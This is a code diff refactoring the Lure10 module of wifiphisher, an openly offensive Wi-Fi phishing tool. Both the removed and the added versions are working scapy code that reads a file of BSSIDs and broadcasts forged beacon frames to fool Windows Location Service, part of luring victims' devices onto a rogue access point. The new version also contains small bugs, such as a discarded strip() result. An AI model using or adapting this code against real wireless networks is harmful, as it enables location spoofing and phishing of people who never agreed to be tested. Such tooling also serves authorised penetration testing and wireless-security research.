@@ -6,101 +6,114 @@ to automatic association by fooling the Windows
 Location Service
 """
 
-import struct
 import wifiphisher.common.constants as constants
 import scapy.layers.dot11 as dot11
 
 
 class Lure10(object):
     """
-    Sends a number of beacons to fool Windows Location Service.
+    Sends a number of beacons to fool Windows Location Service
     """
 
     def __init__(self, shared_data):
         """
-        Setup the class with all the given arguments.
+        Setup the class with all the given arguments
 
-        :param self: A Lure10 object.
+        :param self: A Lure10 object
         :param data: Shared data from main engine
         :type self: Deauthentication
-        :type data: dictionary
+        :type data: dict
         :return: None
         :rtype: None
         """
 
-        self.first = True
-        self.first_output = True
+        self.first_run = True
+        self.should_notify = False
         self.data = shared_data
-        self.beacons_num = 0
 
     def get_packet(self, pkt):
         """
-        We start broadcasting the beacons on the first received packet.
+        We start broadcasting the beacons on the first received packet
 
-        :param self: A Lure10 object.
-        :param packet: A scapy.layers.RadioTap object.
+        :param self: A Lure10 object
+        :param packet: A scapy.layers.RadioTap object
         :type self: Lure10
         :type packet: scapy.layers.RadioTap
-        :return: list with the crafted beacon frames
-        :rtype: list
+        :return: A tuple containing ["*"] followed by a list of
+            the crafted beacon frames
+        :rtype: tuple(list, list)
+        .. warning: pkt is not used here but should not be removed since
+            this prototype is requirement
         """
 
-        beacons = []
+        # only run this code once
+        if self.first_run and self.data.args.lure10_exploit:
 
-        if self.first:
-            if self.data.args.lure10_exploit:
-                area_file = constants.LOCS_DIR + self.data.args.lure10_exploit
-                with open(area_file) as a_file:
-                    wlans = [x.strip() for x in a_file.readlines()]
-                    for wlan in wlans:
-                        bssid, essid = wlan.split(' ', 1)
-                        # Frequency for channel 7
-                        frequency = struct.pack("<h", 2407 + 7 * 5)
-                        ap_rates = "\x0c\x12\x18\x24\x30\x48\x60\x6c"
-                        frame = dot11.RadioTap(len=18,
-                                               present='Flags+Rate+Channel+dBm_AntSignal+Antenna',
-                                               notdecoded='\x00\x6c' + \
-                                               frequency + '\xc0\x00\xc0\x01\x00\x00') \
-                                               / dot11.Dot11(subtype=8, \
-                                               addr1='ff:ff:ff:ff:ff:ff', \
-                                               addr2=bssid, \
-                                               addr3=bssid) / dot11.Dot11Beacon(cap=0x2105) \
-                                               / dot11.Dot11Elt(ID='SSID', \
-                                               info="") / dot11.Dot11Elt(ID='Rates', \
-                                               info=ap_rates) / dot11.Dot11Elt(ID='DSset', \
-                                               info=chr(7))
-                        beacons.append(frame)
-            self.beacons_num = len(beacons)
-            self.first = False
+            # setup our data structures inside the if for a better performance
+            beacons = list()
+            bssid = str()
 
-        return (["*"], beacons)
+            # locate the lure10 file
+            area_file = constants.LOCS_DIR + self.data.args.lure10_exploit
+
+            # open the file
+            with open(area_file) as _file:
+                for line in _file:
+                    # remove any white space and store the bssid(fist word)
+                    line.strip()
+                    bssid = line.split(" ", 1)[0]
+
+                    # craft the required packet parts
+                    frame_part_0 = dot11.RadioTap()
+                    frame_part_1 = dot11.Dot11(subtype=8, addr1=constants.WIFI_BROADCAST,
+                                               addr2=bssid, addr3=bssid)
+                    frame_part_2 = dot11.Dot11Beacon(cap=0x2105)
+                    frame_part_3 = dot11.Dot11Elt(ID="SSID", info="")
+                    frame_part_4 = dot11.Dot11Elt(ID="Rates", info=constants.AP_RATES)
+                    frame_part_5 = dot11.Dot11Elt(ID="DSset", info=chr(7))
+
+                    # create a complete packet by combining the parts
+                    complete_frame = (frame_part_0 / frame_part_1 / frame_part_2 / frame_part_3 /
+                                      frame_part_4 / frame_part_5)
+
+                    # add the frame to the list
+                    beacons.append(complete_frame)
+
+                    # make sure this block is never executed again and the notification occurs
+                    self.first_run = False
+                    self.should_notify = True
+
+            return (["*"], beacons)
 
     def send_output(self):
         """
-        Sending a Lure10 note only on the first time.
+        Sending Lure10 notification
 
-        :param self: A Lure10 object.
+        :param self: A Lure10 object
         :type self: Lure10
-        :return: list
+        :return: list of notification messages
         :rtype: list
+        .. note: Only sends notification for the first time to reduce
+            clutters
         """
 
-        if self.data.args.lure10_exploit and self.first_output:
+        # only run it once the packet crafting is done
+        if self.should_notify and self.data.args.lure10_exploit:
 
-            self.first_output = False
+            # make sure this block is not executed again
+            self.should_notify = False
 
-            return ["Lure10 - Sending " +
-                    str(self.beacons_num) +
-                    " beacons to spoof location service"]
+            return ["Lure10 - Spoofing location services"]
 
     def send_channels(self):
         """
         Send all interested channels
 
-        :param self: A Lure10 object.
+        :param self: A Lure10 object
         :type self: Lure10
-        :return: A list with all the channels interested.
+        :return: A list with all the channels interested
         :rtype: list
+        .. note: Only the channel of the target AP is sent here
         """
 
         return [self.data.target_ap_channel]
